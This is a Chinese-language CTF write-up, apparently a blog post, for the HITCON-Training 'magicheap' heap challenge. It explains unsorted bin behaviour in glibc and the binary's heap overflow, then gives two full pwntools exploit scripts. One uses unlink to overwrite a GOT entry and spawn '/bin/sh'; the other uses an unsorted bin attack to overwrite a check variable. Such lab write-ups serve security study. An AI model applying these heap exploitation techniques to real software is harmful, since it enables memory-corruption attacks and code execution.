---
title: lab14_magicheap
data: 2019-07-23
catagories:
- hitcon_trainning
tags: heap unlink unsortedbin_attack
---

<font style='font-size:25px'>Unlink | Unsortedbin_Attack</font>

# unsorted_bin_attack

## unsortedbin

- 一个`chunk`被释放时，当他不属于`fastbin`的范围且不和`top_chunk`相邻，他就会被首先放入`unsortedbin`中。

- `malloc`的时候，如果`fastbin`和`smallbin`里都找不到相应大小的`chunk`，就会去`unsortedbin`里面找。    
    如果大小满足，就会返回相应的`chunk`给用户，不满足，就会将`unsortedbin`中所有的`chunk`放入`smallbin`中。

- 是一个双向链表。   
    - FILO，从链表头部取，放进链表尾部。
    - 取出`chunk`的时候不使用`unlink`的宏。
    ```c
    bck = victim -> bk
    //victim 是当前要取出来的chunk
    unsorted_chunks(av) -> bk = bck 
    bck -> fd = unsorted_chunks(av)
    ```
## attack

- 如果控制了`victim`的bk指向`target_addr - 8`,那么`target_addr`就可以被改写成为`unsorted_bin`的地址。

- 无法更改`target_addr`为指定内容，但可以将其覆盖为一个较大的数字。

    - 可以用来更改循环次数
    - 更改判断流程
    - ......

![ctfwiki图](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/figure/unsorted_bin_attack_order.png)

# 漏洞
一个普通的菜单选择题<font style="font-size:10px">堆的专属题型（bushi</font>。    
提供`create`、`edit` & `delete`，但是`edit`里面没有检查长度造成堆溢出。     
流程中提供一个猜数功能，猜中了就可以调用`system`

# 思路
- 一个错误的想法

一开始是想用`double_free`那种思路，把`fastbins`的某一个`bin`的指针指向`got表`。所以一开始还觉得挺简单的，但很快我就想起了被寻找合适位置冒充`chunk`的`size`域支配的恐惧。     

- `unlink`

我发现基本上所有的堆溢出都可以构造出unlink的利用。只要有类似`nodelist`的指针。 

1. 构造`fake_chunk`,注意`size`大于`0x80`。
2. `delete`触发`unlink`，将`heaparray`指向`atoi`的`got`表。
3. 将`atoi@got`的内容改写成为`system@plt`。
4. 发送`/bin/sh\x00`

    **仍旧`glibc2.27`跑不了。**

- `unsorted bin attack`

    - 看了大佬的`wp`才只知道有这个攻击
    - **`glibc2.27`跑不了。**

![反汇编](https://c-ssl.duitang.com/uploads/item/201907/23/20190723155953_uv5xt.png)   
![l33t](https://c-ssl.duitang.com/uploads/item/201907/23/20190723160231_RvVGR.png)     

这里有个判断，如果`magic`是一个大于`0x1305`的数字就会执行`l33t`这个函数。    
使用`unsorted_bin_attack`更改，执行。
1. 分配3个chunk——第三个是用来隔开`top_chunk`。
2. delete(1)
3. 利用堆溢出更改`chunk_1`的bk域为`magic`的地址。
4. 再次分配一个大小相同的`chunk`。

# exp

## unlink

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

def create(sz,content):
    sleep(0.2)
    sh.sendlineafter(':','1')
    sh.sendlineafter('Heap :',str(sz))
    sh.sendlineafter('heap:',content)

def edit(idx,sz,content):
    sleep(0.2)
    sh.sendlineafter('choice :','2')
    sh.sendlineafter('Index :',str(idx))
    sh.sendlineafter('Heap :',str(sz))
    sh.sendlineafter('heap :',content)

def delete(idx):
    sh.sendlineafter('choice :','3')
    sh.sendlineafter('Index :',str(idx))

if __name__ == '__main__':
    sh = process('./magicheap')
    elf = ELF('./magicheap')
    libc = elf.libc
    atoi_got = elf.got['atoi']
    system_addr = elf.plt['system']
    heaparray = 0x06020E0

    create(0x90,'aaaa')
    create(0x80,'bbbb')
    create(0x80,'cccc')

    fd = heaparray - 24
    bk = heaparray - 16
    payload = p64(0) + p64(0x90) + p64(fd) + p64(bk) + cyclic(0x70) + p64(0x90) + p64(0x90) 

    pause()
    edit(0,len(payload),payload)
    delete(1)

    payload = cyclic(24) + p64(atoi_got)
    edit(0,len(payload),payload)
    
    payload = p64(system_addr)
    edit(0,len(payload),payload)

    sh.sendlineafter("choice :",'/bin/sh\x00')
    
    sh.interactive()
    sh.close()
```

## UnsortedBinAttack

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

def create(sz,content):
    sleep(0.2)
    sh.sendlineafter(':','1')
    sh.sendlineafter('Heap :',str(sz))
    sh.sendlineafter('heap:',content)

def edit(idx,sz,content):
    sleep(0.2)
    sh.sendlineafter('choice :','2')
    sh.sendlineafter('Index :',str(idx))
    sh.sendlineafter('Heap :',str(sz))
    sh.sendlineafter('heap :',content)

def delete(idx):
    sh.sendlineafter('choice :','3')
    sh.sendlineafter('Index :',str(idx))

if __name__ == '__main__':
    sh = process('./magicheap')
    elf = ELF('./magicheap')
    libc = elf.libc

    magic_addr = 0x6020C0

    create(0x10,'aaaa')
    create(0x80,'bbbb')
    create(0x10,'cccc')

    delete(1)
    
    payload = cyclic(0x10) + p64(0) + p64(0x91) + p64(0) + p64(magic_addr - 0x10) 
    edit(0,len(payload),payload)
    
    create(0x80,'dddd')

    sh.sendlineafter('choice :','4869')
    sh.interactive()
    sh.close()
```

# 问题

到底是为什么`glibc2.27`没法跑？

